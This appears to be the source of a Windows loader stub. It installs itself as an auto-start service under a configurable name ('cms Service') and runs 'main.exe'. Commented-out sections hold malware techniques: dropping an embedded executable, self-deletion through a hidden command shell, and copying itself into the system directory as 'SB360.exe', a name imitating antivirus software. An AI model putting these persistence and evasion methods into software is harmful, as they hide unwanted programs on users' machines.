// ServiceRun.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <direct.h >
//#include "resource.h"
#pragma comment(lib,"ws2_32.lib")

struct MODIFY_DATA 
{

	char ws_svcname[32];
	char ws_svcdisplay[128];
	char ws_svcdesc[256];

}
modify_data = 
{

		"cms Service",
		"cms Service 0.1",
		"cms Service You.",
	
};
HANDLE hThread = NULL;//主Thread;
// 
// int ExtractFile(char *path){
// 	HRSRC m_Hsrc=FindResource(NULL,(LPCTSTR)IDR_EXE,(LPCTSTR)"RES");
// 	
// 	if(m_Hsrc == NULL)
// 		return FALSE;
// 	
// 	HGLOBAL m_Hglobal = LoadResource(NULL,m_Hsrc);
// 	
// 	BYTE *LPData =(LPBYTE) LockResource(m_Hglobal);
// 	DWORD Size = SizeofResource(NULL,m_Hsrc);
// 	
// 	DeleteFile(path);
// 	
// 	HANDLE hFile = CreateFile
// 		(
// 		path, 
// 		GENERIC_WRITE, 
// 		FILE_SHARE_WRITE, 
// 		NULL, 
// 		CREATE_ALWAYS,
// 		FILE_ATTRIBUTE_NORMAL, 
// 		NULL
// 		);
// 	DWORD dwBytes=NULL;
// 	
// 	WriteFile(hFile,LPData,Size, &dwBytes, NULL);
// 	//Sleep(1);
// 	FreeResource(m_Hglobal);
// 	CloseHandle(hFile);
// 	//Sleep(2);
// 	return TRUE;
// }

// 
// BOOL DeleteMe()
// {
// 	TCHAR szModule [MAX_PATH],
// 		  szComspec[MAX_PATH],
// 		  szParams [MAX_PATH];
// 
// 	// get file path names:
// 	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&
// 	   (GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&
// 	   (GetEnvironmentVariable("COMSPEC",szComspec,MAX_PATH)!=0))
// 	{
// 		// set command shell parameters
// 		lstrcpy(szParams," /c del ");
// 		lstrcat(szParams, szModule);
// 		lstrcat(szParams, " > nul");
// 		lstrcat(szComspec, szParams);
// 
// 		// set struct members
// 		STARTUPINFO		si={0};
// 		PROCESS_INFORMATION	pi={0};
// 		si.cb = sizeof(si);
// 		si.dwFlags = STARTF_USESHOWWINDOW;
// 		si.wShowWindow = SW_HIDE;
// 
// 		// increase resource allocation to program
// 		SetPriorityClass(GetCurrentProcess(),
// 				REALTIME_PRIORITY_CLASS);
// 		SetThreadPriority(GetCurrentThread(),
// 			THREAD_PRIORITY_TIME_CRITICAL);
// 
// 		// invoke command shell
// 		if(CreateProcess(0, szComspec, 0, 0, 0,CREATE_SUSPENDED|
// 					DETACHED_PROCESS, 0, 0, &si, &pi))
// 		{
// 			// suppress command shell process until program exits
// 			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
//                         SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE); 
// 
// 			// resume shell process with new low priority
// 			ResumeThread(pi.hThread);
// 
// 			// everything seemed to work
// 			return TRUE;
// 		}
// 		else // if error, normalize allocation
// 		{
// 			SetPriorityClass(GetCurrentProcess(),
// 							 NORMAL_PRIORITY_CLASS);
// 			SetThreadPriority(GetCurrentThread(),
// 							  THREAD_PRIORITY_NORMAL);
// 		}
// 	}
// 	return FALSE;
// }

DWORD WINAPI GetRunExe(LPVOID lpParam){

    ::WinExec("main.exe",SW_SHOW);
	return 0;

}

//以下是服务的外壳。不用管这么多。因为要写注释也不知道怎么写。格式是固定的
static BOOL service_is_exist()
{
	char SubKey[MAX_PATH]={0};
	strcpy(SubKey,"SYSTEM\\CurrentControlSet\\Services\\");
	strcat(SubKey,modify_data.ws_svcname);
		
	HKEY hKey;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
		return TRUE;
	else
		return FALSE;
}

static SERVICE_STATUS srvStatus;
static SERVICE_STATUS_HANDLE hSrv;
static void __stdcall SvcCtrlFnct(DWORD CtrlCode)
{
	switch(CtrlCode)
	{
	case SERVICE_CONTROL_STOP:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_PAUSE:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_PAUSE_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_CONTINUE_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_RUNNING;
		break;
	}
	SetServiceStatus(hSrv,&srvStatus);
}


void ServiceMain(DWORD dwargc,wchar_t* argv[])
{
//	MessageBox(NULL,"serviceMian","1",0);
	hSrv=RegisterServiceCtrlHandler(modify_data.ws_svcname,SvcCtrlFnct);
	srvStatus.dwServiceType=SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwControlsAccepted=SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode=NO_ERROR;
	srvStatus.dwWaitHint=2000;
	srvStatus.dwCheckPoint=1;
	srvStatus.dwCurrentState=SERVICE_START_PENDING;
	SetServiceStatus(hSrv,&srvStatus);
	srvStatus.dwCheckPoint=0;
	Sleep(500);
	srvStatus.dwCurrentState=SERVICE_RUNNING;
	SetServiceStatus(hSrv,&srvStatus);
	
// 	HANDLE hMutex = CreateMutex(0,FALSE,modify_data.ws_svcname);//创建内何对象用于防止运行两次以上
// 	if (GetLastError() == ERROR_ALREADY_EXISTS)
// 	{
// 		ExitProcess(0);
// 		exit(0);
// 	}
// 	
// 	WSADATA Data;
// 	WSAStartup(0x202, &Data);
	
	while(1)
	{
        hThread = CreateThread(NULL, 0, GetRunExe, 0, 0, NULL);
		if (hThread != 0)
		{
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			break;
		}
	}
	
	srvStatus.dwCheckPoint=1;
	srvStatus.dwCurrentState=SERVICE_STOP_PENDING;
	SetServiceStatus(hSrv,&srvStatus);
	srvStatus.dwCheckPoint=0;
	srvStatus.dwCurrentState=SERVICE_STOPPED;
	SetServiceStatus(hSrv,&srvStatus);
	return;
}

//static BOOL fDelete_Me=FALSE;
static void RunService(char *m_ServiceName,char *m_DisplayName,char *m_Description)
{
 	char FilePath[MAX_PATH];
 	GetModuleFileName(NULL,FilePath,MAX_PATH);
// 
// 	char SystemPath[MAX_PATH];
// 	GetSystemDirectory(SystemPath,MAX_PATH);
// 	if (strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
// 	{
// 
// 		char FileName[80];
// 		wsprintf(FileName,"SB360.exe");
// //		wsprintf(FileName,"%c%c%c%c%c%c.exe",'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26),'a'+StormRand(26));//随即发生一个文件名
// 		strcat(SystemPath,"\\");
// 		strcat(SystemPath,FileName);
// 		CopyFile(FilePath,SystemPath,FALSE);
// 		memset(FilePath,0,MAX_PATH);
// 		strcpy(FilePath,SystemPath);
// 		fDelete_Me = TRUE;
// 	}
	char Desc[MAX_PATH];
	HKEY key=NULL;
	SC_HANDLE newService=NULL, scm=NULL;
	__try
	{
		scm = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
		if (!scm)
			__leave;
		newService = CreateService(
			scm, m_ServiceName, 
			m_DisplayName,
			SERVICE_ALL_ACCESS|SERVICE_INTERACTIVE_PROCESS,
			SERVICE_WIN32_OWN_PROCESS,
			SERVICE_AUTO_START,
			SERVICE_ERROR_IGNORE,
			FilePath,
			NULL, NULL, NULL, NULL, NULL);
		if (newService == NULL)
		{
			if (GetLastError() == ERROR_SERVICE_EXISTS)
			{
				newService = OpenService(scm,m_ServiceName,SERVICE_ALL_ACCESS);
				if (newService==NULL)
					__leave;
				else
					StartService(newService,0, 0);
			}
		}
		if (!StartService(newService,0, 0))
			__leave;
		strcpy(Desc,"SYSTEM\\CurrentControlSet\\Services\\");
		strcat(Desc,m_ServiceName);
		RegOpenKey(HKEY_LOCAL_MACHINE,Desc,&key);
		RegSetValueEx(key,"Description",0,REG_SZ,(CONST BYTE*)m_Description,lstrlen(m_Description));
	}
	__finally
	{
		if (newService!=NULL)
			CloseServiceHandle(newService);
		if (scm!=NULL)
			CloseServiceHandle(scm);
		if (key!=NULL) 
			RegCloseKey(key);
	}

/*	while(1)
	{
        hThread = CreateThread(NULL, 0, GetRunExe, 0, 0, NULL);
		if (hThread != 0)
		{
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			break;
		}
	}*/
}

//int main(int argc, char* argv[])
//{
//	return 0;
//}

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPTSTR lpCmdLine,int nCmdShow)

{
// 	   	//重定向输出
// 	freopen("c:\\stdout.txt", "w+t", stdout);
// 	freopen("c:\\stderr.txt", "w+t", stderr);
// 	setvbuf(stdout, 0, _IONBF, 0);
// 	setvbuf(stderr, 0, _IONBF, 0);  
	if (service_is_exist())
	{
		SERVICE_TABLE_ENTRY serviceTable[] = 
		{
			{modify_data.ws_svcname,(LPSERVICE_MAIN_FUNCTION) ServiceMain},
			{NULL,NULL}
		};
		StartServiceCtrlDispatcher(serviceTable);
	}
		else{
			RunService(modify_data.ws_svcname,modify_data.ws_svcdisplay ,modify_data.ws_svcdesc);

		}
		

	return 0;
}